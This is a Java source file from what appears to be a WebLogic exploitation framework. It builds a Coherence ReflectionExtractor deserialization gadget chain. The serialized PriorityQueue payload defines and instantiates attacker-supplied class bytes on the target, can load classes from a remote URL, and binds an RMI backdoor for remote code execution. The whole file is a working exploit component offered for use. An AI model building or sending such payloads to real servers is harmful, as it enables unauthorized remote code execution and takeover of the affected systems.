/*
 * Copyright (c) 2020. r4v3zn.
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.r4v3zn.weblogic.framework.gadget.impl;

import com.r4v3zn.weblogic.framework.utils.ReflectionUtils;
import com.r4v3zn.weblogic.framework.entity.GadgetParam;
import com.r4v3zn.weblogic.framework.gadget.ObjectGadget;
import org.mozilla.classfile.DefiningClassLoader;
import java.lang.reflect.Array;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.PriorityQueue;
import java.util.Queue;

import static org.apache.commons.lang3.StringUtils.isBlank;

/**
 * Title: ReflectionExtractorGadget
 * Desc: ReflectionExtractor Gadget
 * Gadget chain:
 *     readObject:797, PriorityQueue (java.util)
 *         heapify:737, PriorityQueue (java.util)
 *             siftDown:688, PriorityQueue (java.util)
 *                 siftDownUsingComparator:722, PriorityQueue (java.util)
 *                     compare:71, ExtractorComparator (com.tangosol.util.comparator)
 *                         extract:81, ChainedExtractor (com.tangosol.util.extractor)
 *                             extract:109, ReflectionExtractor (com.tangosol.util.extractor)
 *                                 invoke:498, Method (java.lang.reflect)
 * Date: 2020/4/19 15:51
 * @version 1.0.0
 */
public class ReflectionExtractorGadget implements ObjectGadget<Queue<Object>> {

    @Override
    public Queue<Object> getObject(String command, URLClassLoader urlClassLoader) throws Exception {
        return null;
    }

    @Override
    public Queue<Object> getObject(byte[] codeByte, String[] bootArgs, String className, URLClassLoader urlClassLoader) throws Exception {
        String classPath = bootArgs[1];
        Class valueExtractorClazz = urlClassLoader.loadClass("com.tangosol.util.ValueExtractor");
        Class reflectionExtractorClazz = urlClassLoader.loadClass("com.tangosol.util.extractor.ReflectionExtractor");
        Class clazz = null;
        Object valueExtractor = Array.newInstance(valueExtractorClazz,4);
        if(isBlank(classPath)){
            Object javascriptNewInstance = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
            Object defineClass = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("defineClass",
                    new Object[]{className, codeByte});
            Object defineClassNewInstance  = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
            Object rmiBind = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("rmiBind",
                    new Object[]{bootArgs[0]});
            Array.set(valueExtractor, 0, javascriptNewInstance);
            Array.set(valueExtractor, 1, defineClass);
            Array.set(valueExtractor, 2, defineClassNewInstance);
            Array.set(valueExtractor, 3, rmiBind);
            clazz = DefiningClassLoader.class;
        }else{
            URL url = new URL(classPath);
            URL[] urls = new URL[]{url};
            valueExtractor = Array.newInstance(valueExtractorClazz,7);
            Object getConstructor = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("getConstructor",
                    new Object[]{new Class[]{URL[].class}});
            Object newInstance = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("newInstance",
                    new Object[]{new Object[]{urls}});
            Object loadClass = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("loadClass",
                    new Object[]{"org.mozilla.classfile.DefiningClassLoader"});
            Object javassistNewInstance  = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
            Object defineClass = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("defineClass",
                    new Object[]{className, codeByte});
            Object defineClassNewInstance  = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
            Object rmiBind = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("rmiBind",
                    new Object[]{bootArgs[0]});
            Array.set(valueExtractor, 0, getConstructor);
            Array.set(valueExtractor, 1, newInstance);
            Array.set(valueExtractor, 2, loadClass);
            Array.set(valueExtractor, 3, javassistNewInstance);
            Array.set(valueExtractor, 4, defineClass);
            Array.set(valueExtractor, 5, defineClassNewInstance);
            Array.set(valueExtractor, 6, rmiBind);
            clazz = URLClassLoader.class;
        }
        return getObject(valueExtractor, clazz, urlClassLoader);
    }

    @Override
    public Queue<Object> getObject(GadgetParam param) throws Exception {
        String className = param.getClassName();
        URLClassLoader urlClassLoader = param.getUrlClassLoader();
        byte[] bytes = param.getCodeByte();
        String[] bootArgs = param.getBootArgs();
        String javascriptUrl = bootArgs[1];
        Class valueExtractorClazz = urlClassLoader.loadClass("com.tangosol.util.ValueExtractor");
        Class reflectionExtractorClazz = urlClassLoader.loadClass("com.tangosol.util.extractor.ReflectionExtractor");
        Class clazz = null;
        Object valueExtractor = Array.newInstance(valueExtractorClazz,4);
        if(isBlank(javascriptUrl)){
            Object javascriptNewInstance = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
            Object defineClass = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("defineClass",
                    new Object[]{className, bytes});
            Object defineClassNewInstance  = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
            Object rmiBind = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("rmiBind",
                    new Object[]{bootArgs[0]});
            Array.set(valueExtractor, 0, javascriptNewInstance);
            Array.set(valueExtractor, 1, defineClass);
            Array.set(valueExtractor, 2, defineClassNewInstance);
            Array.set(valueExtractor, 3, rmiBind);
            clazz = DefiningClassLoader.class;
        }else{
            URL url = new URL(javascriptUrl);
            URL[] urls = new URL[]{url};
            valueExtractor = Array.newInstance(valueExtractorClazz,7);
            Object getConstructor = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("getConstructor",
                    new Object[]{new Class[]{URL[].class}});
            Object newInstance = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("newInstance",
                    new Object[]{new Object[]{urls}});
            Object loadClass = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("loadClass",
                    new Object[]{"org.mozilla.classfile.DefiningClassLoader"});
            Object javassistNewInstance  = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
            Object defineClass = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("defineClass",
                    new Object[]{className, bytes});
            Object defineClassNewInstance  = reflectionExtractorClazz.getConstructor(String.class).newInstance("newInstance");
            Object rmiBind = reflectionExtractorClazz.getConstructor(String.class, Object[].class).newInstance("rmiBind",
                    new Object[]{bootArgs[0]});
            Array.set(valueExtractor, 0, getConstructor);
            Array.set(valueExtractor, 1, newInstance);
            Array.set(valueExtractor, 2, loadClass);
            Array.set(valueExtractor, 3, javassistNewInstance);
            Array.set(valueExtractor, 4, defineClass);
            Array.set(valueExtractor, 5, defineClassNewInstance);
            Array.set(valueExtractor, 6, rmiBind);
            clazz = URLClassLoader.class;
        }
        return getObject(valueExtractor, clazz, urlClassLoader);
    }

    /**
     * 获取序列化 payload
     * @param valueExtractors ValueExtractors
     * @param clazz 反序列化的 class
     * @return 序列结果
     * @throws Exception
     */
    private Queue<Object> getObject(final Object valueExtractors, Class clazz, URLClassLoader urlClassLoader) throws Exception {
        Class chainedExtractorClazz  = urlClassLoader.loadClass("com.tangosol.util.extractor.ChainedExtractor");
        Object chainedExtractor = chainedExtractorClazz.getConstructor(valueExtractors.getClass()).newInstance(valueExtractors);
        Class extractorComparatorClazz = urlClassLoader.loadClass("com.tangosol.util.comparator.ExtractorComparator");
        // ExtractorComparator extractorComparator = new ExtractorComparator(chainedExtractor);
        Object extractorComparator = extractorComparatorClazz.getConstructor(urlClassLoader.loadClass("com.tangosol.util.ValueExtractor")).newInstance(chainedExtractor);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2);
        queue.add("1");
        queue.add("1");
        // set PriorityQueue comparator to extractorComparator
        ReflectionUtils.setFieldValue(queue, "comparator",  extractorComparator);
        final Object[] queueArray = (Object[]) ReflectionUtils.getFieldValue(queue, "queue");
        queueArray[0] = clazz;
        queueArray[1] = "1";
        return queue;
    }
}
